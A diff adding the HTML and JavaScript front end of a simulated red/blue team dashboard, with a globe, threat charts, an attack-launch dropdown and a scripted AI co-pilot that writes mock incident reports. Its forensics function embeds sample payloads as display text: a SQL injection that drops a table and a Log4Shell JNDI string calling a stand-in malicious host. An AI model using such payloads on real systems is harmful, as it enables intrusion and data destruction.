@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI-Driven Red/Blue Team Simulation Engine</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/three"></script>
+    <script src="https://unpkg.com/globe.gl"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.8.49/Tone.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --defcon-color: #00ff80;
+            --defcon-glow: rgba(0, 255, 128, 0.4);
+            --defcon-bg: rgba(0, 255, 128, 0.05);
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background-color: #050505;
+            font-family: 'Fira Code', monospace;
+            color: #e0e0e0;
+            user-select: none;
+            transition: background-color 0.5s ease;
+        }
+
+        body.defcon-5 { --defcon-color: #00ff80; --defcon-glow: rgba(0, 255, 128, 0.4); --defcon-bg: rgba(0, 255, 128, 0.02); }
+        body.defcon-4 { --defcon-color: #00ccff; --defcon-glow: rgba(0, 204, 255, 0.4); --defcon-bg: rgba(0, 204, 255, 0.05); }
+        body.defcon-3 { --defcon-color: #ffcc00; --defcon-glow: rgba(255, 204, 0, 0.4); --defcon-bg: rgba(255, 204, 0, 0.05); }
+        body.defcon-2 { --defcon-color: #ff6600; --defcon-glow: rgba(255, 102, 0, 0.5); --defcon-bg: rgba(255, 102, 0, 0.08); }
+        body.defcon-1 { --defcon-color: #ff0033; --defcon-glow: rgba(255, 0, 51, 0.6); --defcon-bg: rgba(255, 0, 51, 0.15); }
+
+        .glass-panel {
+            background: linear-gradient(135deg, rgba(15, 20, 25, 0.7) 0%, rgba(5, 10, 15, 0.8) 100%);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--defcon-glow);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.6), inset 0 0 20px var(--defcon-bg);
+            border-radius: 12px;
+            transition: all 0.5s ease;
+        }
+
+        .hacker-text { color: var(--defcon-color); text-shadow: 0 0 8px var(--defcon-glow); transition: color 0.5s ease, text-shadow 0.5s ease; }
+        .ai-text { color: #b700ff; text-shadow: 0 0 8px rgba(183, 0, 255, 0.5); }
+        
+        .ai-panel {
+            background: linear-gradient(135deg, rgba(30, 10, 40, 0.7) 0%, rgba(15, 5, 20, 0.8) 100%);
+            border: 1px solid rgba(183, 0, 255, 0.3);
+            box-shadow: 0 0 15px rgba(183, 0, 255, 0.1);
+        }
+
+        .red-team-panel {
+            background: linear-gradient(135deg, rgba(40, 10, 10, 0.7) 0%, rgba(20, 5, 5, 0.8) 100%);
+            border: 1px solid rgba(255, 51, 102, 0.3);
+            box-shadow: 0 0 15px rgba(255, 51, 102, 0.1);
+        }
+
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.2); }
+        ::-webkit-scrollbar-thumb { background: var(--defcon-color); border-radius: 4px; }
+
+        .live-indicator { position: relative; display: flex; align-items: center; justify-content: center; }
+        .live-dot { height: 10px; width: 10px; background-color: var(--defcon-color); border-radius: 50%; z-index: 2; transition: background-color 0.5s ease; }
+        .live-pulse { position: absolute; height: 20px; width: 20px; background-color: var(--defcon-color); border-radius: 50%; animation: pulse 1.5s infinite ease-out; z-index: 1; transition: background-color 0.5s ease; }
+
+        @keyframes pulse { 0% { transform: scale(0.5); opacity: 0.8; } 100% { transform: scale(2.5); opacity: 0; } }
+        
+        .scanlines {
+            position: relative;
+            overflow: hidden;
+        }
+        .scanlines::before {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+        }
+
+        #globe-container { position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; }
+        #ui-layer { position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 10; pointer-events: none; }
+        .interactive-element { pointer-events: auto; }
+
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .log-entry { animation: slideIn 0.3s ease-out forwards; }
+        
+        #boot-screen {
+            position: fixed; inset: 0; z-index: 50;
+            background-color: #050505;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            transition: opacity 1s ease;
+        }
+    </style>
+</head>
+<body class="defcon-5">
+
+    <div id="boot-screen">
+        <div class="text-green-500 font-mono text-sm w-96 h-32 mb-8" id="boot-text"></div>
+        <button id="btn-init" class="hidden border border-green-500 text-green-500 hover:bg-green-500 hover:text-black px-8 py-3 text-sm font-bold tracking-widest uppercase transition-all shadow-[0_0_15px_rgba(0,255,128,0.2)] hover:shadow-[0_0_25px_rgba(0,255,128,0.6)] cursor-pointer">
+            INITIALIZE SOC AUDIO & SYSTEMS
+        </button>
+    </div>
+
+    <div id="app-wrapper" style="opacity: 0; transition: opacity 1s ease;">
+        <div id="globe-container"></div>
+
+        <div id="ui-layer" class="p-4 sm:p-6 flex flex-col md:flex-row justify-between gap-6 h-full w-full box-border">
+            
+            <!-- Left Panel -->
+            <div class="flex flex-col gap-4 w-full md:w-80 lg:w-96 h-full z-20">
+                
+                <!-- Status Box -->
+                <div class="glass-panel p-5 interactive-element shrink-0 flex flex-col gap-3">
+                    <div class="flex items-center justify-between border-b border-gray-800 pb-3">
+                        <div class="flex items-center gap-3">
+                            <div class="live-indicator"><div class="live-pulse"></div><div class="live-dot"></div></div>
+                            <h1 class="text-xs font-bold tracking-[0.2em] text-gray-400 uppercase">Sys: <span id="defcon-label" class="text-green-400">DEFCON 5</span></h1>
+                        </div>
+                        <div class="flex gap-2">
+                            <button id="btn-export-db" class="text-[9px] bg-blue-900/50 hover:bg-blue-700 text-blue-300 px-2 py-1 rounded border border-blue-700 transition-colors cursor-pointer flex items-center gap-1 shadow-[0_0_8px_rgba(0,100,255,0.2)]">
+                                <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
+                                EXPORT DB (CSV)
+                            </button>
+                            <span class="text-[10px] bg-gray-900/50 text-gray-400 px-2 py-1 rounded border border-gray-700">ZERO-TRUST</span>
+                        </div>
+                    </div>
+                    
+                    <h2 class="text-3xl font-black hacker-text tracking-tight">THREAT RADAR</h2>
+                    
+                    <div class="grid grid-cols-2 gap-3 pt-2">
+                        <div class="bg-black/40 rounded p-3 border border-white/5">
+                            <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">Total Events</div>
+                            <div class="text-2xl font-bold text-white" id="counter-total">0</div>
+                        </div>
+                        <div class="bg-black/40 rounded p-3 border border-white/5">
+                            <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">Active Threats</div>
+                            <div class="text-2xl font-bold" id="counter-active" style="color: var(--defcon-color)">0</div>
+                        </div>
+                        <div class="col-span-2 ai-panel rounded p-3 relative overflow-hidden">
+                            <div class="absolute -right-4 -top-4 w-16 h-16 bg-purple-600/20 rounded-full blur-xl animate-pulse"></div>
+                            <div class="text-[10px] text-purple-400 uppercase tracking-wider mb-1 flex items-center gap-2">
+                                <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z"></path></svg>
+                                Threats Neutralized by AI
+                            </div>
+                            <div class="text-2xl font-bold ai-text" id="counter-ai">0</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Red Team Injector Box -->
+                <div class="red-team-panel p-4 interactive-element rounded-xl shrink-0 flex flex-col gap-2">
+                    <div class="flex justify-between items-center mb-1">
+                        <h3 class="text-xs font-bold text-red-400 uppercase tracking-widest flex items-center gap-2">
+                            <svg class="w-4 h-4 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                            Red Team Injector
+                        </h3>
+                        <span class="text-[9px] text-red-400/50">MANUAL OVERRIDE</span>
+                    </div>
+                    <p class="text-[10px] text-red-300/70 mb-1">Launch targeted attacks to observe AI investigation.</p>
+                    <div class="flex gap-2 w-full">
+                        <select id="attack-selector" class="bg-black/60 text-gray-300 border border-red-900/50 rounded p-2 text-xs flex-grow outline-none focus:border-red-500 cursor-pointer">
+                            <!-- Injected by JS -->
+                        </select>
+                        <button id="btn-launch" class="bg-red-900/40 hover:bg-red-600 hover:text-white text-red-400 border border-red-500/50 rounded px-4 py-2 text-xs font-bold transition-all active:scale-95 cursor-pointer shadow-[0_0_10px_rgba(255,51,102,0.2)] hover:shadow-[0_0_15px_rgba(255,51,102,0.6)]">
+                            LAUNCH
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Chart Box -->
+                <div class="glass-panel p-4 interactive-element flex-grow flex flex-col min-h-[220px]">
+                    <h3 class="text-xs font-bold text-gray-300 uppercase tracking-widest mb-2 shrink-0">Active Signatures</h3>
+                    <div class="relative flex-grow w-full h-full">
+                        <canvas id="chart-signatures" class="absolute inset-0"></canvas>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right Panel -->
+            <div class="flex flex-col gap-4 w-full md:w-80 lg:w-[420px] h-full z-20">
+                <div class="ai-panel p-5 interactive-element h-[50%] min-h-[250px] flex flex-col rounded-xl scanlines">
+                    <div class="flex justify-between items-center mb-2 border-b border-purple-900/50 pb-2 relative z-10">
+                        <h3 class="text-sm font-bold text-purple-400 uppercase tracking-widest flex items-center gap-2">
+                            <svg class="w-4 h-4 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
+                            AI SecOps Co-Pilot
+                        </h3>
+                        <div class="flex items-center gap-2">
+                            <button id="btn-download" class="hidden bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white px-2 py-1 rounded border border-gray-600 text-[9px] font-bold tracking-widest transition-all cursor-pointer flex items-center gap-1 shadow-[0_0_8px_rgba(255,255,255,0.1)]">
+                                <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
+                                EXPORT REPORT
+                            </button>
+                            <span class="text-[10px] bg-gray-900/50 text-gray-400 px-2 py-1 rounded-full border border-gray-700 transition-colors duration-300" id="ai-status">MONITORING</span>
+                        </div>
+                    </div>
+                    <div id="ai-terminal" class="flex-grow overflow-y-auto text-[11px] flex flex-col gap-1 pr-2 mt-2 break-words relative z-10 whitespace-pre-wrap">
+                        <div class="text-gray-500 italic mb-2">>> Model: Neural_Guardian_v3.1 initialized.</div>
+                        <div class="text-gray-500 italic mb-2">>> System standing by. Awaiting Red Team injection...</div>
+                    </div>
+                </div>
+
+                <div class="glass-panel p-5 interactive-element h-[50%] flex flex-col">
+                    <div class="flex text-[10px] font-bold text-gray-500 uppercase tracking-wider mb-2 px-1 border-b border-gray-800 pb-2">
+                        <div class="w-12">Time</div>
+                        <div class="w-12 text-center text-purple-400/70">ML%</div>
+                        <div class="w-20">Origin</div>
+                        <div class="flex-grow">Event Vector</div>
+                    </div>
+                    <div id="live-log-container" class="overflow-y-auto flex-grow flex flex-col justify-start space-y-1 pr-2 mt-1"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let audioCtxReady = false;
+        const synths = {};
+        
+        async function initAudio() {
+            await Tone.start();
+            audioCtxReady = true;
+            
+            synths.thud = new Tone.MembraneSynth({ pitchDecay: 0.2, octaves: 4, oscillator: { type: "sine" }, envelope: { attack: 0.01, decay: 0.4, sustain: 0.01, release: 1 }, volume: -10 }).toDestination();
+            synths.typewriter = new Tone.NoiseSynth({ noise: { type: "pink" }, envelope: { attack: 0.005, decay: 0.05, sustain: 0, release: 0.01 }, volume: -25 }).toDestination();
+            synths.ping = new Tone.PolySynth(Tone.Synth, { oscillator: { type: "triangle" }, envelope: { attack: 0.01, decay: 0.3, sustain: 0, release: 0.1 }, volume: -15 }).toDestination();
+            synths.error = new Tone.Synth({ oscillator: { type: "sawtooth" }, envelope: { attack: 0.01, decay: 0.2, sustain: 0.1, release: 0.5 }, volume: -10 }).toDestination();
+            synths.alarm = new Tone.Oscillator({ frequency: 220, type: "sawtooth", volume: -20 }).toDestination();
+            
+            synths.alarmLfo = new Tone.LFO("4n", 220, 440).connect(synths.alarm.frequency);
+            synths.alarmLfo.start();
+        }
+
+        function playThud() { if(audioCtxReady) synths.thud.triggerAttackRelease("C1", "8n"); }
+        function playTypewriter() { if(audioCtxReady) synths.typewriter.triggerAttackRelease("16n"); }
+        function playPing() { if(audioCtxReady) synths.ping.triggerAttackRelease(["C5", "E5"], "8n"); }
+        function playError() { if(audioCtxReady) synths.error.triggerAttackRelease("A2", "4n"); }
+        function toggleAlarm(on) { 
+            if(!audioCtxReady) return;
+            if(on && synths.alarm.state !== "started") synths.alarm.start();
+            else if(!on && synths.alarm.state === "started") synths.alarm.stop();
+        }
+
+        const bootLines = [
+            "Initializing kernel... OK",
+            "Loading Neural_Guardian_v3.1 weights... OK",
+            "Establishing Zero-Trust architecture... OK",
+            "Connecting global threat feeds... OK",
+            "SYSTEM READY. WAITING FOR AUDIO CONTEXT."
+        ];
+        
+        async function runBootSequence() {
+            const bootText = document.getElementById('boot-text');
+            for(let i=0; i<bootLines.length; i++) {
+                bootText.innerHTML += `<div>> ${bootLines[i]}</div>`;
+                await new Promise(r => setTimeout(r, 200 + Math.random() * 300));
+            }
+            document.getElementById('btn-init').classList.remove('hidden');
+        }
+        runBootSequence();
+
+        document.getElementById('btn-init').addEventListener('click', async () => {
+            await initAudio();
+            document.getElementById('boot-screen').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('boot-screen').style.display = 'none';
+                document.getElementById('app-wrapper').style.opacity = '1';
+                playPing();
+            }, 1000);
+        });
+
+        document.getElementById('btn-export-db').addEventListener('click', () => {
+            window.open('/export', '_blank');
+        });
+
+        const THREAT_TYPES = [
+            { name: "SSH Brute-Force", mitre: "T1110", color: "#ff3366" },
+            { name: "Port Sweep", mitre: "T1046", color: "#00ccff" },
+            { name: "DDoS SYN Flood", mitre: "T1498", color: "#ff9900" },
+            { name: "SQL Injection", mitre: "T1190", color: "#cc33ff" },
+            { name: "Log4Shell Exploit", mitre: "T1190.005", color: "#ff0033" },
+            { name: "Zero-Day Payload", mitre: "T1106", color: "#00ff80" }
+        ];
+
+        const STATE = { totalAttacks: 0, activeThreats: 0, aiMitigated: 0, activeArcs: [], defcon: 5, stats: { signatures: {} } };
+        THREAT_TYPES.forEach(t => STATE.stats.signatures[t.name] = 0);
+
+        const domActive = document.getElementById('counter-active');
+        const domDefconLabel = document.getElementById('defcon-label');
+
+        function updateDefconState() {
+            domActive.innerText = STATE.activeThreats;
+            let newDefcon = 5;
+            
+            // Raised threshold to require manual spamming to trigger alarms
+            if(STATE.activeThreats <= 3) newDefcon = 5;
+            else if(STATE.activeThreats > 3 && STATE.activeThreats <= 6) newDefcon = 4;
+            else if(STATE.activeThreats > 6 && STATE.activeThreats <= 9) newDefcon = 3;
+            else if(STATE.activeThreats > 9 && STATE.activeThreats <= 12) newDefcon = 2;
+            else if(STATE.activeThreats > 12) newDefcon = 1;
+
+            if(newDefcon !== STATE.defcon) {
+                document.body.classList.remove(`defcon-${STATE.defcon}`);
+                document.body.classList.add(`defcon-${newDefcon}`);
+                STATE.defcon = newDefcon;
+                
+                domDefconLabel.innerText = `DEFCON ${newDefcon}`;
+                const colors = {5: '#00ff80', 4: '#00ccff', 3: '#ffcc00', 2: '#ff6600', 1: '#ff0033'};
+                domDefconLabel.style.color = colors[newDefcon];
+                world.atmosphereColor(colors[newDefcon]);
+
+                if(newDefcon === 1) toggleAlarm(true);
+                else toggleAlarm(false);
+            }
+        }
+
+        const attackSelector = document.getElementById('attack-selector');
+        THREAT_TYPES.forEach(threat => {
+            const opt = document.createElement('option');
+            opt.value = threat.name;
+            opt.innerText = `${threat.name} (${threat.mitre})`;
+            attackSelector.appendChild(opt);
+        });
+
+        const globeContainer = document.getElementById('globe-container');
+        const world = Globe()(globeContainer)
+            .globeImageUrl('https://unpkg.com/three-globe/example/img/earth-dark.jpg')
+            .bumpImageUrl('https://unpkg.com/three-globe/example/img/earth-topology.png')
+            .backgroundColor('#050505')
+            .showAtmosphere(true)
+            .atmosphereColor('#00ff80')
+            .atmosphereAltitude(0.15)
+            .arcsData([])
+            .arcColor('color')
+            .arcDashLength(0.4)
+            .arcDashGap(0.2)
+            .arcDashInitialGap(() => Math.random() * 2)
+            .arcDashAnimateTime(1000)
+            .arcsTransitionDuration(0)
+            .arcStroke(d => d.stroke)
+            .pointOfView({ lat: 20, lng: -20, altitude: 2.2 });
+
+        world.controls().autoRotate = true;
+        world.controls().autoRotateSpeed = 0.4;
+        window.addEventListener('resize', () => { world.width(window.innerWidth); world.height(window.innerHeight); });
+
+        Chart.defaults.color = '#888';
+        Chart.defaults.font.family = "'Fira Code', monospace";
+        const ctxSig = document.getElementById('chart-signatures').getContext('2d');
+        const chartSignatures = new Chart(ctxSig, {
+            type: 'doughnut',
+            data: { labels: THREAT_TYPES.map(t => t.name), datasets: [{ data: THREAT_TYPES.map(() => 0), backgroundColor: THREAT_TYPES.map(t => t.color), borderWidth: 1, borderColor: '#050505' }] },
+            options: { 
+                responsive: true, 
+                maintainAspectRatio: false, 
+                cutout: '75%',
+                layout: { padding: 10 },
+                plugins: { legend: { position: 'right', labels: { color: '#aaa', font: { size: 9 }, boxWidth: 12, padding: 8 } } } 
+            }
+        });
+
+        const domTotal = document.getElementById('counter-total');
+        const domAi = document.getElementById('counter-ai');
+        const domLogContainer = document.getElementById('live-log-container');
+        const aiTerminal = document.getElementById('ai-terminal');
+        const aiStatus = document.getElementById('ai-status');
+        const btnDownload = document.getElementById('btn-download');
+
+        const investigationQueue = [];
+        let isAiBusy = false;
+        let latestIncidentReport = null;
+
+        function generateForensics(threatName) {
+            if (threatName.includes("SSH") || threatName.includes("Brute")) return { credentials: "User: 'root' | Pass: 'admin123', 'qwerty'", payload: "N/A" };
+            else if (threatName.includes("SQL")) return { credentials: "N/A", payload: "' OR 1=1; DROP TABLE users;--" };
+            else if (threatName.includes("Log4Shell")) return { credentials: "N/A", payload: "${jndi:ldap://malicious-ip.com/a}" };
+            else if (threatName.includes("DDoS")) return { credentials: "N/A", payload: "Volumetric SYN Packets (10,000 pps)" };
+            return { credentials: "Unknown", payload: "Obfuscated Binary Stream" };
+        }
+
+        async function typeTerminalLine(text, colorClass) {
+            const line = document.createElement('div');
+            line.className = `term-line ${colorClass} mt-1`;
+            aiTerminal.appendChild(line);
+            aiTerminal.scrollTop = aiTerminal.scrollHeight;
+            
+            for(let i=0; i<text.length; i++){
+                line.textContent += text.charAt(i); 
+                if(i % 3 === 0) playTypewriter();
+                await new Promise(r => setTimeout(r, 10 + Math.random() * 20));
+            }
+            if (aiTerminal.children.length > 25) aiTerminal.removeChild(aiTerminal.childNodes[2]);
+        }
+
+        function processAiQueue() {
+            if (isAiBusy || investigationQueue.length === 0) {
+                if (!isAiBusy && aiStatus.innerText !== "MONITORING") {
+                    aiStatus.innerText = "MONITORING";
+                    aiStatus.className = "text-[10px] bg-gray-900/50 text-gray-400 px-2 py-1 rounded-full border border-gray-700 transition-colors duration-300";
+                }
+                return;
+            }
+
+            isAiBusy = true;
+            const event = investigationQueue.shift();
+            
+            aiStatus.innerText = "INVESTIGATING";
+            aiStatus.className = "text-[10px] bg-blue-900/80 text-blue-200 px-2 py-1 rounded-full border border-blue-500 animate-pulse";
+            btnDownload.classList.add('hidden'); 
+
+            // BREACH LOGIC: 20% chance the AI fails to stop the manual attack
+            const isBreach = Math.random() < 0.20; 
+
+            let aiResponseAction = "";
+            let accessResult = "";
+            let finalStatus = "";
+            let terminalColor = "text-green-400";
+
+            if (isBreach) {
+                aiResponseAction = "CRITICAL FAILURE: Payload executed before WAF rule applied. Escalating to Human IR Team.";
+                accessResult = "COMPROMISED (Root Access Achieved)";
+                finalStatus = "BREACH DETECTED - ACTIVE THREAT";
+                terminalColor = "text-red-500";
+            } else {
+                accessResult = "DENIED";
+                finalStatus = "NEUTRALIZED";
+                if(event.threatName.includes("Zero-Day") || event.threatName.includes("Log4Shell")) {
+                    aiResponseAction = "Routing to Isolated Honeypot VLAN for Behavioral Sandboxing.";
+                    accessResult = "DENIED (Sandboxed)";
+                } else if(event.threatName.includes("Brute")) {
+                    aiResponseAction = "Banning IP via WAF & forcing MFA.";
+                } else if(event.threatName.includes("SQL")) {
+                    aiResponseAction = "Sanitizing input & isolating DB container.";
+                } else {
+                    aiResponseAction = "Null-routing source IP autonomously.";
+                }
+            }
+
+            typeTerminalLine(`>> [ALERT] Anomaly ${event.aiScore}% detected from ${event.ip}`, 'text-orange-400 font-bold').then(() => {
+                setTimeout(() => {
+                    typeTerminalLine(`>> [INSPECT] Analyzing payload signature mapping to ${event.threatMitre}...`, 'text-blue-400').then(() => {
+                        setTimeout(() => {
+                            if (isBreach) {
+                                aiStatus.innerText = "BREACH";
+                                aiStatus.className = "text-[10px] bg-red-900/80 text-red-200 px-2 py-1 rounded-full border border-red-500 animate-pulse";
+                                typeTerminalLine(`>> [FAILED] ${aiResponseAction}`, 'text-red-500 font-bold');
+                                playError();
+                            } else {
+                                aiStatus.innerText = "RESOLVED";
+                                aiStatus.className = "text-[10px] bg-green-900/80 text-green-200 px-2 py-1 rounded-full border border-green-500";
+                                typeTerminalLine(`>> [RESOLVED] ${aiResponseAction}`, 'text-green-400 font-bold');
+                                playPing();
+                            }
+                            
+                            const forensics = generateForensics(event.threatName);
+                            latestIncidentReport = `
+=========================================================
+NEURAL GUARDIAN SOC - AUTOMATED INCIDENT REPORT
+=========================================================
+Incident ID     : INC-${event.id.toUpperCase()}
+Timestamp       : ${event.time.toISOString()}
+Threat Vector   : ${event.threatName} (MITRE ${event.threatMitre})
+AI Confidence   : ${event.aiScore}%
+
+--- THREAT ORIGIN ---
+Source IP       : ${event.ip}
+Geo-Location    : ${event.originCountry} (Lat: ${event.startLat.toFixed(2)}, Lng: ${event.startLng.toFixed(2)})
+
+--- FORENSIC ANALYSIS ---
+Attempted Creds : ${forensics.credentials}
+Payload Snippet : ${forensics.payload}
+Access Achieved : ${accessResult}
+
+--- MITIGATION STATUS ---
+Action Taken    : ${aiResponseAction}
+Final Status    : ${finalStatus}
+=========================================================`.trim();
+
+                            setTimeout(() => {
+                                typeTerminalLine(`>> [REPORT] Incident forensic report compiled.`, 'text-purple-300');
+                                btnDownload.classList.remove('hidden'); 
+                                
+                                if (!isBreach) {
+                                    STATE.aiMitigated++;
+                                    domAi.innerText = STATE.aiMitigated.toLocaleString();
+                                    domAi.parentElement.classList.add('scale-105', 'transition-transform');
+                                    setTimeout(() => domAi.parentElement.classList.remove('scale-105'), 150);
+                                }
+                                
+                                STATE.activeThreats--;
+                                updateDefconState();
+                                isAiBusy = false; 
+                            }, 500);
+                        }, 1000);
+                    });
+                }, 800);
+            });
+        }
+
+        setInterval(processAiQueue, 500);
+
+        const ws = new WebSocket(`ws://${window.location.host}/ws/threats`);
+        
+        ws.onopen = () => {
+            console.log("Connected to Python backend");
+            setTimeout(() => {
+                typeTerminalLine(">> WSS:// Secure WebSocket link to Python backend established.", "text-green-400 font-bold");
+                typeTerminalLine(">> Listening for live backend threat streams...", "text-green-400");
+            }, 2500);
+        };
+
+        ws.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            data.time = new Date(); 
+            
+            if (data.isAnomaly) {
+                playThud();
+            }
+            
+            processEvent(data);
+        };
+
+        document.getElementById('btn-launch').addEventListener('click', () => {
+            playPing();
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                const payload = { threatName: attackSelector.value };
+                ws.send(JSON.stringify(payload));
+            } else {
+                typeTerminalLine(">> [ERROR] No connection to Python Backend.", "text-red-500 font-bold");
+            }
+        });
+
+        btnDownload.addEventListener('click', () => {
+            if (!latestIncidentReport) return;
+            const blob = new Blob([latestIncidentReport], { type: "text/plain" });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `SOC_Incident_Report_${new Date().getTime()}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        });
+
+        function processEvent(event) {
+            STATE.totalAttacks++;
+            
+            if (event.isAnomaly) {
+                STATE.activeThreats++; 
+                updateDefconState();
+            }
+            
+            if (STATE.stats.signatures[event.threatName] !== undefined) {
+                STATE.stats.signatures[event.threatName]++;
+            }
+            
+            domTotal.innerText = STATE.totalAttacks.toLocaleString();
+            
+            const arcColor = event.isManual ? ['#ff0055', '#b700ff'] : [event.color, '#ffffff'];
+            const newArc = {
+                id: event.id, startLat: event.startLat, startLng: event.startLng,
+                endLat: event.endLat, endLng: event.endLng, color: arcColor, stroke: 1.5
+            };
+            
+            STATE.activeArcs = [...STATE.activeArcs, newArc];
+            world.arcsData(STATE.activeArcs);
+
+            setTimeout(() => {
+                STATE.activeArcs = STATE.activeArcs.filter(a => a.id !== event.id);
+                world.arcsData(STATE.activeArcs);
+            }, 1000);
+
+            appendLogEntry(event);
+            if (event.isAnomaly) investigationQueue.push(event);
+        }
+
+        function appendLogEntry(event) {
+            const timeStr = event.time.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute:'2-digit', second:'2-digit' });
+            let aiScoreColor = event.isAnomaly ? 'text-purple-400 font-bold' : 'text-gray-500';
+            
+            let bgClass = event.isAnomaly ? 'bg-red-900/20 border-red-900/50' : 'bg-transparent border-transparent opacity-60';
+            let manualTag = event.isAnomaly ? `<span class="text-[8px] bg-red-900/80 text-white font-bold px-1 py-0.5 rounded border border-red-500 ml-1">MANUAL</span>` : '';
+
+            const logElement = document.createElement('div');
+            logElement.className = `log-entry flex items-center text-[11px] font-mono py-1.5 border-b transition-colors cursor-crosshair rounded px-1 ${bgClass}`;
+            
+            logElement.innerHTML = `
+                <div class="w-12 text-gray-500">${timeStr}</div>
+                <div class="w-12 text-center ${aiScoreColor}">${event.aiScore}%</div>
+                <div class="w-20 text-gray-400 truncate pr-1">${event.originCountry}</div>
+                <div class="flex-grow flex items-center justify-between overflow-hidden">
+                    <div class="flex items-center truncate">
+                        <span class="truncate" style="color: ${event.color}; text-shadow: 0 0 5px ${event.color}40;">${event.threatName}</span>
+                        ${manualTag}
+                    </div>
+                </div>
+            `;
+            
+            domLogContainer.insertBefore(logElement, domLogContainer.firstChild);
+            if (domLogContainer.children.length > 30) domLogContainer.removeChild(domLogContainer.lastChild);
+        }
+
+        setInterval(() => {
+            chartSignatures.data.datasets[0].data = THREAT_TYPES.map(t => STATE.stats.signatures[t.name]);
+            chartSignatures.update('none');
+        }, 1000);
+
+    </script>
+</body>
+</html>
